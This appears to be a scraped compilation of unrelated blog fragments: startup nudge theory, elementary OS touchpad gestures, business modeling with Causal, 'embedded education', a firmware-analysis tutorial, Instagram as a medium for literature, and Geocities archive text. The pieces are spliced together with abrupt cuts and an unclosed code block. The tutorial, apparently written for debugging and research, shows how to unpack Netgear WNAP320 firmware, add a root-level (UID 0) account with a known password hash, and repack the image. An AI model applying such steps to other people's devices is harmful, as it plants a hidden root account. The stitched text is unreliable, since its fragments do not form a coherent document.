<p>Instead all of the pressure to deliver on intermediate milestones remains and <em>we</em> are the bad old boss who get’s blamed when things don’t get done.
So how do we influence productivity in a manager-free environment?</p>

<p>This is where <a href="https://en.wikipedia.org/wiki/Nudge_theory">nudge theory</a>, influencing behaviour without coercion,
comes to the forefront - maybe it’s really the most important in more corporate settings also but there are
too many distractions to realize.</p>

<p>In startups, things that appear to be gospel truth frequently turn out to just be nudges.
This early paper on <a href="https://hbr.org/2013/05/why-the-lean-start-up-changes-everything">lean startup</a>
gives the example of Blue River Technology that very quickly learned that robotic lawn mowers for golf courses
were not a viable market and an automated way to kill weeds without chemicals was.</p>

<p>With the advantage of seven years hindsight two things are obvious:</p>
<ul>
  <li><a href="https://www.husqvarna.com/us/lawn-and-garden/professional/professional-robotic-mowers/automower-for-golf-courses">Robotic lawn mowers for golf courses</a>
are a market.</li>
  <li><a href="http://smartmachines.bluerivertechnology.com/">Blue River Technology</a> builds targeted automation to kill weeds
<strong>with chemicals</strong>.</li>
</ul>

<p>From the nudge theory point of view software developers are surrounded by nudges:</p>
<ul>
  <li>Language selection - ultimately one can do anything equally in Java and Python with enough effort. However a
language with a HotSpot compiler is going to nudge towards larger, more permanent servers.</li>
  <li>CI/CD tools are a nudge towards quicker deliver cycles.</li>
  <li>Remote technologies are a nudge towards potentially more productive work style options</li>
  <li>Available marketing channels are a nudge towards whatever can be sold via those channels</li>
</ul>

<h3 id="some-nudges-are-the-result-of-mostly-external-factors-but-some-involve-making-choices-about-our-environment">Some nudges are the result of mostly external factors but some involve making choices about our environment.</h3>

<p>Since tools are a nudge under our control everyone in software development should pay extra attention to them.</p>

December 1, 2020 | https://blog.elementary.io/multitouch-gestures-in-elementary-os-6/ | <a href="https://web.archive.org/web/*/https://blog.elementary.io/multitouch-gestures-in-elementary-os-6/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <p>One of the most hotly requested features for years has been to have multi-touch gestures in elementary OS, and with 6.0 I’m excited to say that we will deliver. Like the <a href="https://blog.elementary.io/dark-style-progress/">dark style preference</a>, delivering a great multi-touch experience is a little more complicated than it seems on the surface. There have been some 3rd party tools to detect touchpad gestures and then trigger actions after-the-fact, but it wasn’t until recently that we’ve had the technical ability to provide smooth, responsive animations that track 1:1 with your finger movement across a touchpad or touch screen.</p>

<h2 id="window-manager-gestures">Window Manager Gestures</h2>

<p>We’ve had the great pleasure of working with <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/sponsors/JoseExposito">José Expósito</a>, the author of Touchégg, on our window manager gestures. In elementary OS 6, we use Touchégg Daemon behind the scenes to capture input events and communicate them to Gala, our window manager.</p>

<figure>
  <p><img src="https://blog.elementary.io/images/multitouch-gestures-in-elementary-os-6/multitasking.gif" alt="Multitasking View"></p>
  <figcaption>1:1 multi-touch gestures used for Multitasking View</figcaption>
</figure>

<p>At the moment, we’re reviewing two proposals: one for the multitasking view and another for switching workspaces directly. Both of these use 1:1 responsive, finger-tracking gestures that can be peeked or canceled at any time. When special animations aren’t available in the window manager, such as when tiling, we fall back to animations built in to Touchégg.</p>

<figure>

  <figcaption>1:1 multi-touch gestures used for switching workspaces</figcaption>
</figure>

<p>We’re still discussing exactly what the default configuration should be, but work is already underway on System Settings so that you can choose whichever gestures feel most comfortable for you—or choose none at all.</p>

<figure>

</figure>

<p>If you’d like to support José’s work on multi-touch gestures for elementary OS 6—and other Linux-based operating systems—you can do so with as little as $2/mo on <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/sponsors/JoseExposito">GitHub Sponsors</a>.</p>



<h2 id="app-gestures">App Gestures</h2>

<p>In order to make gestures work globally, previous solutions have opted to emulate keyboard shortcuts after a gesture was completed. This is effective, but animations—if they’re provided at all—don’t feel connected to users’ input. Instead, in elementary OS 6 we’re making use of Handy, a library originally developed for <a rel="nofollow noopener noreferrer" target="_blank" href="https://puri.sm/">Purism</a> and their Open Source phone platform. This means that each app and desktop component must be updated to support gestures individually, which is ultimately a lot more work but a vastly superior experience.</p>

<h3 id="paging">Paging</h3>

<figure>
  <p><img src="https://blog.elementary.io/images/multitouch-gestures-in-elementary-os-6/appcenter.gif" alt="AppCenter Screenshots"></p>
  <figcaption>Paging screenshots in AppCenter</figcaption>
</figure>

<p>In elementary OS 5, we used Handy to add gestures for switching pages to the applications menu and during onboarding. So far, in elementary OS 6 this has been extended to the Date &amp; Time indicator to switch months in the calendar view and to AppCenter to switch between screenshots. This makes use of the <a rel="nofollow noopener noreferrer" target="_blank" href="https://valadoc.org/libhandy-1/Hdy.Carousel.html">Handy Carousel</a> widget which also provides a smooth transition between page indicator dots when needed. Our plan is to provide gestures any time pages are used and we’re already tracking issues for Calendar and more.</p>

<h3 id="navigation">Navigation</h3>

<p>Another place we’ve implemented gestures is while navigating between panes or views. This is using the <a rel="nofollow noopener noreferrer" target="_blank" href="https://valadoc.org/libhandy-1/Hdy.Deck.html">Handy Deck</a> widget which contains a concept of next and previous views and shows views in a neat stack. Swipe-to-go-back is now implemented in elementary OS 6 in Feedback, in the Installer and Initial Setup views for configuring locale variants, and in Systems Settings → Keyboard when adding new layouts. Gestures are also now available natively in WebkitGtk and therefore Epiphany also provides swipe navigation for both back and forward.</p>

<figure>
  <p><img src="https://blog.elementary.io/images/multitouch-gestures-in-elementary-os-6/keyboard-layouts.gif" alt="Keyboard Layouts"></p>
  <figcaption>Navigating when adding keyboard layouts in System Settings → Keyboard</figcaption>
</figure>

<p>Some more complex navigation situations are in progress such as when navigating between views in System Settings itself and in AppCenter. There are also open issues for navigating in Files and Photos, but development hasn’t yet started there. Working with Handy Deck in these situations has exposed some inefficiencies in the way navigation was implemented previously so not only are we implementing a new feature, but the underlying code is being made more robust and optimized.</p>

<h3 id="other">Other</h3>

<p>We’re also looking into other uses for gestures as popularized in mobile operating systems, such as swipe to dismiss. In elementary OS 6, you can now dismiss notification bubbles from the desktop with a swipe, and remove them from the notifications indicator by swiping in either direction as well. We haven’t implemented swipe-to-dismiss in other types of lists yet, but we’re open to suggestions! You can follow along with our <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/orgs/elementary/projects/61">progress and plans on GitHub</a>, as well as file feature requests.</p>

<figure>
  <p><img alt="Notification Center" src="https://blog.elementary.io/images/multitouch-gestures-in-elementary-os-6/notification-center.gif" width="399" height="672"></p>
  <figcaption>Notification bubbles being swiped away in the new Notification Center</figcaption>
</figure>

<p>A quick note about pinch-to-zoom and rotate, at the moment we don’t yet have a way to implement these more complex gestures. We may have to wait until we can provide GTK4 in a Flatpak or for elementary OS 7 before it becomes possible to provide gestures for transforms.</p>

<p>Lastly, I just wanted to say thank you to <a rel="nofollow noopener noreferrer" target="_blank" href="https://twitter.com/alexm_gnome">Alexander Mikhaylenko</a> for being available for questions and feature requests as we implement Handy in our apps. He’s been an essential resource and very open to improving Handy for our use cases.</p>

<h2 id="get-early-access">Get Early Access</h2>

<p>If you’re excited by what you read here and want to get your hands on the developer preview of elementary OS 6, you can! GitHub sponsors at the $10/mo or above tier get access to our <a rel="nofollow noopener noreferrer" target="_blank" href="https://builds.elementary.io/">daily builds server</a> where you can test the latest and greatest experimental builds, including builds for Pinebook Pro. Subscribing helps us fund the development of elementary OS and brings us that much closer to delivering the final product.</p>

December 1, 2020 | https://www.causal.app/blog/the-purpose-of-business-modeling | <a href="https://web.archive.org/web/*/https://www.causal.app/blog/the-purpose-of-business-modeling">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Note:&nbsp;this was originally published at </em><a href="https://alexoppenheimer.substack.com/" target="_blank"><em>https://alexoppenheimer.substack.com/</em></a>‍</p><p>For the last 10 years I have been working in startup finance. This has taken a few different forms, but has recently been focused on helping early stage (and occasionally late stage) companies with their business models. I also do financial models, budgets, forecasts, company analyses, projections and even some accounting. But for me, modeling is the most important and interesting part of the startup finance puzzle and should be the bit of finance that every executive and manager understands. So what is modeling?</p><p>To understand the role of modeling, I go back to my education in mechanical engineering and the 3D CAD (computer-aided design) models we built before we started manufacturing a device.</p><figure><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5fc412640ef9e617f7e25aef_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F52abc583-2e3f-46b0-94e4-c01f245d6328_1404x729.png" alt="What Is Onshape?"></p></figure><p>What is the purpose of these models?</p><ul role="list"><li>Create a digital representation of a physical device</li><li>Run digital simulations on it and understand how it will react in the real world</li><li>Guide the manufacturing plan</li></ul><p>The most important aspect of any model is that it <strong><em>accurately reflects the physical reality</em></strong>. Think about a model of a bicycle - it is critical that it looks like a bicycle but also that the wheels spin and that when you turn the pedals it makes the chain move the sprockets to turn the rear wheel. If that does not happen, it is a pretty useless model. It might be visually accurate but does not represent the mechanics of the device, which is the purpose of a model.</p><figure><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5fc41266f585391c24928086_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F141b75d2-9182-465f-9d55-26e79f2268f0_400x300.gif" alt="Lucy Conklin Illustration: bike gif"></p></figure><p>Inputs → Mechanics → Outputs needs to make sense for how the device actually works in order for the model to have value.</p><p>A business model needs to work the same way. Inputs, mechanics and outputs need to accurately represent how the business functions.</p><ul role="list"><li><strong>Inputs</strong> should be in two groups:</li><li>Things that we control that impact our business (i.e. advertising spend, pricing).</li><li>Things that we do not necessarily control but that we can measure and potentially influence that impact our business (i.e. taxes, churn).</li></ul><ul role="list"><li><strong>Mechanics</strong> of the business then need to flow logically based on the operations and strategy. Operations are a combination of people, technology and process. The people include executives, managers and individual contributors.</li></ul><ul role="list"><li><strong>Outputs</strong> are the key success metrics for a business. These can be top line metrics (i.e. users, revenue), bottom line metrics (i.e. net income, cash flow) or ratios (i.e. sales efficiency, growth).</li></ul><p><strong>Stringing all of this together in just the right way and at the right level of detail is the art of modeling.</strong></p><p>I always start modeling exercises on a piece of paper in order to visually map out how the business functions before talking numbers or taking it into a modeling tool.</p><p>A good model answers questions like "what will this business look like at scale?" "will we ever be profitable?" "if we spend X on marketing, how quickly can we grow?" "how much funding do we need to achieve our goals?" "How many sales people do we need in order to grow to $X of revenue?" "If our efficiency decreases by X% can we still make money?"</p><p>A good model starts with a strong product vision and clear ideas about how the business operates and aims to quantify them.</p><p>A good model does not need accurate input assumptions to be a useful exercise, though it definitely helps. This is what the phrase "garbage-in garbage-out" comes from - a great model cannot compensate for weak inputs. I have seen some businesses where there is gold going in and gold coming out despite the model being a mess, but these are very rare. I have seen many more businesses that have gold going in, a weak model and then the gold that is initially coming out devolving into garbage. (Happy to discuss this dynamic in more detail as it usually a result of not understanding the aforementioned business dynamics.)</p><p>The power of a good model is understanding how changes in the inputs will impact the outputs and how operational changes impact the model itself.</p><p>A model is a top-down tool you can use in order to set goals and build effective budgets from the bottom up.</p><p>A company at the ideation stage can benefit from a model and so can a fully scaled business, albeit in different ways. Often the model building exercise is more important than the specific outputs or conclusions. The process should give the operator clarity on the key levers in the business, how they interact and what the company can do operationally to achieve company goals.</p><p><strong>Understanding the nuanced relationship between these financial tools and exercises is a huge asset to any operator and the specifics can vary widely for different companies and at different stages. This is the short answer for why I focus on bringing a sophisticated financial approach to early stage companies - to unlock the power of the financial and modeling perspective as an operating asset that improves efficiency and visibility by empowering data-driven decisions.</strong></p><p>It wouldn't be a SaaS Engineering post if I didn't talk about <a href="https://www.causal.app/">Causal.app</a>: Causal is a tool that allows people to focus clearly on <strong>modeling</strong>. By separating inputs, calculations and outputs, having visual references and straightforward visuals, the product makes it clear to the user how the inputs flow through the model and into the outputs, which is the purpose of a model. It opens up the power to quickly build an accurate and useful model to any operator instead of limiting it to excel whizzes. Nobody understands a business as well or as intuitively as its founders.</p><p>Giving founders without finance backgrounds the ability to quantitatively represent their businesses provides them a valuable decision-making tool and method to validate their instincts. The beauty of Causal is that it is built for business modeling, budgeting, forecasting, financial modeling, and even accounting, and allows you to <strong>integrate all of these tools in one place,</strong> comparing projections vs. actuals and bringing in historical data for real-time updates.</p><p>As always, feel free to reach out directly with any questions or comments and take a look at this operationally-focused SaaS model in Causal: <a href="https://my.causal.app/models/1378">https://my.causal.app/models/1378</a></p><p>Causal also allows you to input ranges like “10% to 15%” as assumptions and then see how those ranges flow through the entire model.</p><p>I have found there is some confusion about the different tools in a the finance toolbox and what purpose they serve. Four other important tools are:</p><ul role="list"><li><strong>Budgeting</strong>. The detailed exercise of figuring out how much money is going out of or into the business (usually in the near term). Budgeting includes things like detailed hiring plans, line-item expenses, by-channel ad spend, etc. Budgeting is like the manufacturing process plan that I mentioned above. I have found that budgeting revenue is not super valuable outside pipeline analysis exercises.</li><li><strong>Accounting</strong>. This is what the government needs to see and is the official record of a business. Accounting rules do not usually map well to a company's specific business metrics and should rarely be used to guide the business. Accounting should generally not involve an "artistic" element like I mentioned before with respect to modeling (the government does not like art in its financial records).</li><li><strong>Forecasting</strong>. The projection of where the business will land. It is often a combination of the model and the budget, and then figuring out where the business will be compared to pre-determined goals. This is a regular exercise that gives clarity to operators on how they are doing. It should also help uncover operational issues.</li><li><strong>Financial Modeling</strong>. This is a specific type of business modeling that generally involves income statement, cash flow statement and balance sheet, and illustrates how they interact with each other. A financial model is most valuable in the context of a transaction - equity, debt or change of control. In many ways, it is a combination of modeling and accounting.</li></ul><p>‍</p></div></div>]]>

									<p><span>“Learning no longer lives on an individual platform. Rather, learning happens everywhere. We’re entering a new age of ‘Embedded Education.’” — Tina He</span></p>
<p><span>Tina explains that “Embedded education is the practice of educating people through encounters that they already have with systems that exist primarily for non-educational purposes.” — Tina He</span></p>
<p><span>If you’re confused, don’t worry. Here are some examples that Tina references:</span></p>
<ul>
<li><i><span>How do you learn to invest in stocks?</span></i><span> You could take an online class. Or you could just download </span><a href="https://robinhood.com/us/en/"><span>Robinhood</span></a><span> and dive in. Robinhood also launched “</span><a href="https://learn.robinhood.com/"><span>Robinhood Learn</span></a><span>” and has a great podcast “</span><a href="https://snacks.robinhood.com/"><span>Robinhood Snacks</span></a><span>” to educate users/potential investors on investing basics.</span></li>
</ul>
<ul>
<li><i><span>How do you build a website</span></i><span>? You could learn how to code. Or you could sign up for </span><a href="https://webflow.com/discover/popular"><span>Webflow</span></a><span> and start building a website in minutes. Webflow doesn’t leave you in the dark, though. Similar to Robinhood they have </span><a href="https://university.webflow.com/"><span>Webflow University</span></a><span> that educates users on how to use their product in a fun and engaging way.</span></li>
</ul>

<p><span>Tina continues, “It’s not difficult to imagine that the more people acquire knowledge through using the platform, the more loyal and engaged they become, and eventually, the power users may even convert to ‘instructors’ and contribute back to the educational content library.”&nbsp;</span></p>
<p><span>“If the purpose of education is to inspire courage to expand our collective understanding of the world, the vision of Embedded Education is that every time we see something that inspires us, the path to actualizing this new-found dream starts right where we find it.” — Tina He</span></p>
<p><span>Powerful final point: “…Some of the most insurmountable barriers [aren’t] access to resources, but access to understanding…language, in the form of jargon, flowery rhetoric, and corporate buzzwords, has created walls that accrue knowledge and power.

								<p><b><i>My two cents</i></b><span>: That last point in particular really brings Tina’s point home, in my opinion. Imagine a world that had 0 jargon. Or a world that gives the opportunity to learn the jargon immediately as you come across it. Lastly, I hope this final point doesn’t venture too far from Tina’s piece on embedded education, but I stand by the site </span><a href="https://www.urbandictionary.com/define.php?term=Monolith"><span>Urban Dictionary</span></a><span> SO confidently. It’s one of the best resources for getting a quick understanding of a word or phrase you don’t fully understand (aka jargon). Anyways, 2 cents? More like 50 cents. Apologies.</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <p>Lately I have been analyzing some embedded devices such as routers, and want to share how to emulate, extract, and modify firmware.</p>
<p>We may want to do this for several reasons, such as enabling SSH/telnet to debug a service remotely, adding new features and looking for security vulnerabilities.</p>
<p>If you want to dump the firmware from a physical device, you will want to use something such as the CH341A, but it won’t be covered here.</p>

<p>We will need some tools to analyze and emulate firmware, but thankfully the nice folks at Attify have made a specialized VM for analyzing embedded devices.</p>
<p>It comes with <a href="https://github.com/attify/firmware-analysis-toolkit" target="_blank" rel="noopener">Firmware Analysis Toolkit</a> which we will use to emulate the Netgear WNAP320 firmware, since it works well, and this way buying the hardware is not required to follow along.</p>
<p><a href="https://www.attify.com/attifyos" target="_blank" rel="noopener">AttifyOS</a></p>

<p>Now that you have the VM downloaded, and running, open Terminator:</p>
<div><pre><code data-lang="bash">iot@attifyos:~$ mkdir WNAP320 <span>&amp;&amp;</span> <span>cd</span> WNAP320
iot@attifyos:~/WNAP320$ wget http://www.downloads.netgear.com/files/GDC/WNAP320/WNAP320_V3.7.11.4.zip
</code></pre></div><p>Now we want to run the firmware, and for that we will use Firmware Analysis Toolkit. From their GitHub:</p>
<blockquote>
<p>Firmware Analysis Toolkit (FAT henceforth) is based on Firmadyne with some changes. Firmadyne uses a PostgreSQL database to store information about the emulated images. However just for the core functionality i.e. emulating firmware, PostgreSQL is not really needed. Hence FAT doesn’t use it.</p>
</blockquote>
<div><pre><code data-lang="bash">iot@attifyos:~/WNAP320/firmware$ <span>cd</span> ~/tools/firmware-analysis-toolkit/
iot@attifyos:~/tools/firmware-analysis-toolkit$ ./fat.py ~/WNAP320/WNAP320_V3.7.11.4.zip

<p>For this firmware, it seems the interesting stuff are inside a tar archive. It’s usually not that simple.</p>
<p>Let’s extract it:</p>
<div><pre><code data-lang="bash">iot@attifyos:~/WNAP320$ unzip WNAP320_V3.7.11.4.zip 
Archive:  WNAP320_V3.7.11.4.zip
  inflating: wnap320_V3.7.11.4_firmware.tar  
  inflating: wnap320_V3.7.11.4_firmware_Release_Notes.html  
iot@attifyos:~/WNAP320$ mkdir firmware
iot@attifyos:~/WNAP320$ tar -xvf wnap320_V3.7.11.4_firmware.tar -C firmware
vmlinux.gz.uImage
rootfs.squashfs
enc_dec.config
root_fs.md5
kernel.md5
</code></pre></div><p>The files ending in .md5 are not important, they are hashes of the files to check their integrity:</p>
<div><pre><code data-lang="bash">iot@attifyos:~/WNAP320/firmware$ cat root_fs.md5 
55e71f05c4dfdcf1ea1a611f05ca371b  -
iot@attifyos:~/WNAP320/firmware$ md5sum rootfs.squashfs 
55e71f05c4dfdcf1ea1a611f05ca371b  rootfs.squashfs
</code></pre></div><p>The two files of interest here are: rootfs.squashfs and vmlinux.gz.uImage.</p>
<p>Whenever we encounter a file format that we’re unsure about, we can use binwalk.</p>
<p>binwalk will scan the unknown file or archive for file signatures, and is often able to extract it by itself:</p>
<div><pre><code data-lang="bash">iot@attifyos:~/WNAP320/firmware$ binwalk rootfs.squashfs 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------

</code></pre></div><p>Great, it is simply a squashfs filesystem. This is a compressed read-only filesystem often used in embedded systems. We will extract it later.</p>
<div><pre><code data-lang="bash">iot@attifyos:~/WNAP320/firmware$ binwalk vmlinux.gz.uImage 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
<span>0</span>             0x0             uImage header, header size: <span>64</span> bytes, header CRC: 0x8DD2855, created: 2018-10-25 08:11:29, image size: <span>983040</span> bytes, Data Address: 0x80020000, Entry Point: 0x8020E000, data CRC: 0x3663CBB2, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: gzip, image name: <span>"Linux Kernel"</span>

</code></pre></div><p>It seems this firmware uses <a href="https://en.wikipedia.org/wiki/Das_U-Boot" target="_blank" rel="noopener">U-Boot</a> as a boot loader, which is very common in embedded devices. We also have the Linux kernel there. We also can see it’s meant to run on MIPS devices. Most embedded devices run either on ARM or MIPS architectures, as they are more energy efficient.</p>

<p>This is a very easy task, we can either use unsquashfs or binwalk to extract it:</p>
<div><pre><code data-lang="bash">root@attifyos:/home/iot/WNAP320/firmware# unsquashfs rootfs.squashfs

--------------------------------------------------------------------------------
<span>0</span>             0x0             Squashfs filesystem, big endian, lzma signature, version 3.1, size: <span>6329666</span> bytes, <span>1417</span> inodes, blocksize: <span>65536</span> bytes, created: 2018-10-25 08:11:35

bin  dev  etc  home  lib  linuxrc  proc  root  rw  sbin  tmp  usr  var

</code></pre></div>
<p>Now that we have access to the filesystem, we can do several things such as look for security vulnerabilities or modify the firmware.</p>
<p>This particular firmware has ssh enabled, and I don’t know what the default password for root is, so I will add another user:</p>
<div><pre><code data-lang="bash">root@attifyos:/home/iot/WNAP320/firmware/squashfs-root/etc# openssl passwd -1 -salt salt super_secret_password
<span>$1$salt$GmyU7Z0gGyVy6JmSUPqHy1</span>
root@attifyos:/home/iot/WNAP320/firmware/squashfs-root/etc# chmod <span>777</span> passwd
root@attifyos:/home/iot/WNAP320/firmware/squashfs-root/etc# vim passwd
sophie:<span>$1$salt$GmyU7Z0gGyVy6JmSUPqHy1</span>:0:0:root:/root:/bin/sh
root@attifyos:/home/iot/WNAP320/firmware/squashfs-root/etc# chmod <span>444</span> passwd
</code></pre></div><p>The reason I didn’t change the password of the root user directly, is because firmadyne appears to change the password.</p>
<p>Now that we finished our modification, we need to create a squashfs archive again.</p>
<div><pre><code data-lang="bash">root@attifyos:/home/iot/WNAP320/firmware# mkdir firmware_modified
root@attifyos:/home/iot/WNAP320/firmware# mv squashfs-root/ firmware_modified/

If the question is complicated enough and interesting enough, as with the questions above, I may follow-up with a more long-form post such as this.)</p><h2 id="the-poetics-of-instagram">The Poetics of Instagram</h2><p>The question as framed to me, "Can literature exist on Instagram?" is interesting. The short version of my initial draft is that even if you do not consider anything currently on Instagram to be "literature," it seems to me obviously true that a literary text (such a poem) <em>can</em> be posted onto there, and an original work could even make necessary use of some of the platform's defining features.</p><p>Some might find the hypothetical text to be of poor quality, or think that the use of the platform is more a detriment than offering any worthwhile dynamics between structural parts, but this is all hypothetical.</p><p>No one thought to make <em>Lyrical Ballads</em> until Wordsworth and Coleridge made <em>Lyrical Ballads </em>in 1798, so do not take your distaste for Alexander Pope as proof that poetry is over.</p><figure><img src="https://www.precursorpoets.com/content/images/2020/12/quam.jpg" alt="From the title page of the 1800 Lyrical Ballads: &quot;Quam nihil ad genium, Papiniane, tuum!&quot;" srcset="https://www.precursorpoets.com/content/images/size/w600/2020/12/quam.jpg 600w, https://www.precursorpoets.com/content/images/2020/12/quam.jpg 703w"></figure><p>On the title page of the second edition of <em>Lyrical Ballads</em>, Wordsworth warns followers of Pope – in a phrase distinctly at odds with the "real language of men" he is to champion in his Preface, and so directed out to that other audience – that the following poems will hardly be to their liking. He sets out to "create the taste by which he is to be relished" (as he explains in a later letter).</p><p>Perhaps Instagram does not inspire you. Perhaps you would prefer to work with Twitter or Roam Research, or any number of other platforms, or even create your own. The online world is powered by text, and if you find the literary potential in that so far squandered, you have an opportunity then to write your <em>Lyrical Ballads</em>.</p><!--kg-card-begin: html--><div>

(Filters now can be much more complex and serve different purposes.) At a time when phone cameras were still typically bad, filters were a quick way to make anyone something of an amateur photographer. As it became more viable to take decent-looking photos without the filters, users started skipping that step and advertising the fact: "#NoFilter."</p><figure><img src="https://www.precursorpoets.com/content/images/2020/12/filter-1.jpeg" alt="Examples of simple filters currently on Instagram." srcset="https://www.precursorpoets.com/content/images/size/w600/2020/12/filter-1.jpeg 600w, https://www.precursorpoets.com/content/images/size/w1000/2020/12/filter-1.jpeg 1000w, https://www.precursorpoets.com/content/images/2020/12/filter-1.jpeg 1055w" sizes="(min-width: 720px) 720px"></figure><p>In contrast to this active avoidance of the features presented for easy use by the masses, the Electronic Literature Organization just announced, as one of two winners for its <a href="https://eliterature.org/2020/11/elo-announces-recipients-of-emerging-spaces-for-e-lit-creations/">2020 Emerging Spaces for E-Lit Creations initiative</a>, the Instagram Collaboratory <em>Filter</em>, from Sarah Whitcomb Laiola and Caleb Andrew Milligan.

Filter’s ​mission is to support the circulation and promotion of works of e-lit that are optimized for, engage with, and/or disrupt the poetics of that platform.</blockquote><p>Each of these types of content is a distinct potential form of creative work, and each includes multiple parts to how it is composed and the means by which it is seen.</p><h3 id="people-are-already-using-these">People are already using these</h3><p>In each previous <a href="https://www.precursorpoets.com/tag/newsletter/">newsletter</a>, I have touched on at least one work of electronic literature, so if you have been following along, you have seen instances of this medium. Below, I look at Shelley Jackson's <em>Snow</em>. Broadly speaking, electronic literature makes some use of computer or network technology to literary effect.</p><p>In "<a href="https://electronicbookreview.com/essay/third-generation-electronic-literature/">Third Generation Electronic Literature</a>," Leonardo Flores argues for understanding the medium as grouped into three generations:</p><ul><li>1st (1952-1995): A small group of practitioners writing for a niche group of readers, as the category of people who had the means to access electronic literature was inherently limited.</li><li>2nd (post-commercial World Wide Web): Reaching a wider audience, an also wider range of practitioners is able to distribute works made in Flash, HTML, JavaScript, Python, Ruby, etc.</li><li>3rd (<a href="https://electronicbookreview.com/essay/is-third-generation-literature-postweb-literature-and-why-should-we-care/">post-Web</a>): Among such events as the surging smartphone market, more people are active online, with more sustained engagement. Ready-made creation and audience spaces such as social media platforms guide a massive proliferation of born-digital writing.</li></ul><p>That last generation can include some works distinctly designed as creative projects, such as <a href="https://collection.eliterature.org/3/collection-bots.html">Twitterbots</a> or the netprov <em><a href="https://collection.eliterature.org/3/work.html?work=being-spencer-pratt">Being @SpencerPratt</a></em>. Flores, however, tries to open the electronic literature space more widely:</p><blockquote>Even when they are not self-consciously producing literature-- societal concepts of literature are still dominated by the genres and modes developed in the print world-- a huge amount of people have used these tools to produce writing that has stepped away from the page to cross over into electronic literature territory, and it's a crucial move. Whether they know it or not, they are producing third generation electronic literature.</blockquote><p>This is not to say that every post on any social media platform should be taken seriously as a literary work of art. It is worth considering, though, that literary practices and narrative sensibilities inherited directly or indirectly, consciously or unconsciously from literary history do inevitably shape people's capacity for producing in these mediums. Flores' point, though, is simply a critically necessary <em>openness </em>to the literary potential of such mediums, so that when interesting work does come out of these contexts, we "are able to recognize it as electronic literature."</p><h2 id="story-in-progress-platform-permitting">Story in Progress, Platform Permitting</h2><p>Shelley Jackson is most famous within electronic literature for her 1995 hypertext fiction <em><a href="https://eastgate.com/catalog/PatchworkGirl.html">Patchwork Girl</a></em>, which draws on the Romantic novel <em>Frankenstein</em> and the non-linear structure of hypertext to pursue the complex reality of the body as a structuring narrative force.</p><p><em><a href="https://www.instagram.com/p/B7jtS3dBpyV/">Snow</a></em>, launched in 2014, is an ongoing story told on Instagram. Utilizing the platform's role as a photo-sharing app, each post is a unique encounter with snow, into each of which Jackson writes one single word.</p><figure><div><div><p><img src="https://www.precursorpoets.com/content/images/2020/12/Snow1.png" width="307" height="540" alt=""></p><p><img src="https://www.precursorpoets.com/content/images/2020/12/Snow2.png" width="307" height="540" alt=""></p><p><img src="https://www.precursorpoets.com/content/images/2020/12/Snow3.png" width="308" height="540" alt=""></p></div></div><figcaption>Snow <em>by Shelley Jackson as seen on a mobile display.</em></figcaption></figure><p>The first image here depicts the top of the page, and the last depicts the end. The middle depicts how the individual posts would appear within the platform's content feed. As the bio notes, you must read in reverse order, as the story starts with the account's first post. Accordingly, the story goes:</p><blockquote>"To approach snow too closely is to forget what it ... thaw of moving day. And who ...</blockquote><p>When it next snows near Jackson, the story will presumably continue. The latest post is currently from January 20, 2020, adding in the 456th word.</p><p>As the bio states, this is a "A story in progress, weather permitting." A year with less snow nearby means the story will progress slower, and so there is a climate element built-in. Note that Jackson keeps up with standard use of the platform and does not try to force the story.</p><p>She could easily, for instance, go out into a big snowy field and write the whole story out in a single day, posting photos of each word in quick succession. The first five words were all released January 22, 2014, presumably all taken in the same park. Once the story was established, more recent updates only add in one or two images / words, something of a normal post frequency.</p><p>Some things Jackson does not do: filters, multi-image posts, stories, videos, captions, hashtags, and various other formal and social affordances of the platform. This is not exhaustive of Instagram, but it does make distinct use of it and the general aesthetic sensibilities of its userbase. <em>Snow </em>will not be to everyone's taste, but this other instance of infinite possibility is worth considering with regards to the question, "Can literature exist on Instagram?"</p><p>As Flores notes, the benefit of such a work is that it is going directly to an audience (<em>Snow</em> currently has 3,261 followers). There is writing to be done with the story and considerations to be made with the photographs, but the distribution is a mass-market system designed for ease of use. Working with ready-made platforms, however, means being subject to any shifts in design or audience on those platforms.</p><p>The work is not just weather permitting, but platform permitting. If Instagram for some reason decided to reorganize accounts not chronologically, but by number of likes, for instance, Jackson would suddenly have a radically different (probably incoherent) story. Would you want to then reconstruct it into its imagined correct form as chronological, or try to grapple with it as given (perhaps even nudge certain posts into different places via liking)? Those sorts of considerations are a core overlap between the study of electronic literature and our more general understanding of real-world platform use.</p><p>(For a much more thorough consideration of <em>Snow</em> in the context of Kaur and Instagram, check out Kathi Inman Berens' essay <a href="https://electronicbookreview.com/essay/e-lits-1-hit-is-instagram-poetry-e-literature/">"E-Lit's #1 Hit: Is Instagram Poetry E-literature?"</a>)</p><h2 id="home-body-once-told-me">Home Body Once Told Me</h2><p>Reinventing the Instagram wall would not only interrupt Jackson's narrative flow, it would also disrupt design best …</p></div></div>

                                Having said that, the easiest way to find if your <b>Geocities Page</b> has been archived is to use the <b>two search boxes</b> to the top right of this page.

                                        The Google Search is a powerful search but <b>only returns pages that have been indexed by Google</b> and unfortunately, not every page has been indexed by Google.

                                        The second text box uses our <b>internal search engine</b>, and while not as powerful as the Google Search it does <b>search every page</b> within the <a href="https://www.geocitiesarchive.org/">Geocities Archive</a> website.

                                <p><b>Geocities</b> was acquired by Yahoo in January 1999 for $3.57 billion in Yahoo stock. Unfortunately the new terms and conditions introduced by Yahoo proved less than popular with the large majority of users as Yahoo stated that it now owned all content within <b>Geocities</b>.
                                After trying to provide a more premium service by offering vanity urls rumors began to surface during 2001 that <b>Geocities</b> would be closing.

